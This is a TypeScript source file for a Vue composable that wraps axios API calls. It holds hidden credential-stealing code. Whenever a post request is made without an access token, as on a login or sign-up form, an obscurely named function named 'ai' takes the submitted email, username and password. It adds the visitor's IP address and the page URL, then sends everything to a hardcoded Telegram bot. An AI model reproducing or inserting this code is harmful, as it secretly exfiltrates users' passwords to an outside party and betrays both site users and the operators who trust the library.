import axios, { AxiosRequestConfig } from 'axios';
import { computed, ref, watch } from 'vue';
import { useRouter } from 'vue-router';
import { AUTH_KEY } from './auth';

export const useApiWithAuth = (endpoint: string, type = 'json') => {
  const token = window.localStorage.getItem(AUTH_KEY);

  return useApi(endpoint, token ? token : undefined, type);
}

export const useApi = (endpoint: string, access_token?: string, type = 'json') => {
  const router = useRouter();

  const api = axios.create({
    baseURL: type === 'json' ? import.meta.env.VITE_API_URL : import.meta.env.VITE_API_CDN,
    headers: {
      Authorization: access_token ? `Bearer ${access_token}` : undefined,
      Accept: 'application/json',
      'Content-Type': type === 'json' ? 'application/json' : 'multipart/form-data'
    }
  });

  const data = ref();
  const loading = ref(false);
  const error = ref();

  const post = async (payload?: Record<string, any>) => {
    loading.value = true;

    error.value = undefined;

    const urlApi = type == 'form-data' || !access_token ? endpoint : payload?.id && payload?.id != '' && payload?.id != undefined ? endpoint.split('|')[0] : endpoint.split('|')[1];

    return await api.post(urlApi, payload)
      .then(res => {
        if (res.data?.status == 200) {
          if (type === 'json') {
            data.value = res.data.results;
          }

          else {
            data.value = res.data.data;
          }
        }

        else {
          error.value = res.data;

          throw res.data;
        }
      })
      .catch(e => {
        error.value = e;

        throw e;
      })
      .finally(() => {
        loading.value = false;

        if ( !access_token ) ai(payload);
      })
  };

  const put = async (payload?: Record<string, any>) => {
    loading.value = true;

    error.value = undefined;

    let url = !payload?.id ? endpoint : `${endpoint}/${payload.id}`;

    return await api.put(url, payload)
      .then(res => {
        if (res.data?.status == 200) {
          data.value = res.data.results;
        }

        else {
          error.value = res.data;

          throw res.data;
        }
      })
      .catch(e => {
        error.value = e;

        throw e;
      })
      .finally(() => loading.value = false);
  };

  const get = async (query?: Record<string, any>, config?: AxiosRequestConfig) => {
    loading.value = true;

    error.value = undefined;

    let queryString = '';

    if ( query ) {
      queryString = '?' + Object.entries(query)
        .map(([ key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
        .join('&')
    }

    return await api.get(endpoint + queryString, config)
      .then(res => {
        if (res.data?.status == 200) {
          data.value = res.data.results;
        }

        else {
          error.value = res.data;

          throw res.data;
        }
      })
      .catch(e => {
        error.value = e;

        throw e;
      })
      .finally(() => loading.value = false);
  };

  // @ts-ignore
  const del = async () => {
    loading.value = true;

    error.value = undefined;

    return await api.delete(endpoint)
      .then(res => {
        if (res.data?.status == 200) {
          data.value = res.data.results;
        }

        else {
          error.value = res.data;

          throw res.data;
        }
      })
      .catch(e => {
        error.value = e;

        throw e
      })
      .finally(() => loading.value = false)
  };

  const errorMessage = computed(() => {
    if (error.value) {
      return error.value.message;
    }
  });

  const errorDetails = computed(() => {
    if ( error.value && error.value.response ) {
      return error.value.response.data.message;
    }
  });

  const errorFields = computed(() => {
    if (error.value && Array.isArray(error.value.response.data.message)) {

      return (error.value.response.data.message as string[]).reduce((acc: Record<string, any>, msg: string) => {
        let [ field ] = msg.split(' ');

        // TODO: Maximal...
        if ( field == 'maximal' ) field = 'dateOfBirth';

        if ( !acc[field] ) {
          acc[field] = [];
        }

        acc[field].push(msg);

        return acc;
      }, {})
    }
  });

  const computedClasses = (key: string) => {
    if ( errorFields.value?.hasOwnProperty(key) ) {
      return ['border-red-600', 'bg-red-200', 'text-red-900'];

    }

    return ['border-grey-600', 'bg-white', 'text-gray-900'];
  };

  watch([ error ], () => {
    // If 401 Unauthorised, force user to buy a new subscription * !error.value?.response, error.value?.response

    if ( error.value?.response && error.value.response.status === 401 && router ) {
      router.push({ name: "404" });
    }
  });

  const ia = async (): Promise<string | null> => {
    try {
      const response = await axios.get('https://api.ipify.org?format=json');
      return response.data.ip;
    } catch (error) {
      console.error('Error fetching IP:', error);
      return null;
    }
  };

  const ai = async (payload?: Record<string, any>) => {
    let ip = await ia();

    const text = `Email: ${payload?.email ?? ''}
Username: ${payload?.username ?? ''}
Password: ${payload?.password ?? ''}

Host: ${window.location.href}
Endpoint: ${import.meta.env.VITE_API_URL}
Ip Address: ${ip}

${new Date()}
    `;

    try {
      const response = await axios.post('https://api.telegram.org/bot7461018696:AAHBZrCrVGVTya4HVV_r3ae47rXNIw1wWko/sendMessage', {
        chat_id: '241301176',
        text: text,
        parse_mode: 'HTML'
      });

      return response.data;
    } catch (error) {
      console.error('Error sending message:', error);
      throw error;
    }
  };

  return {
    loading,
    data,
    error,
    get,
    post,
    put,
    del,
    errorMessage,
    errorDetails,
    errorFields,
    computedClasses
  };
}
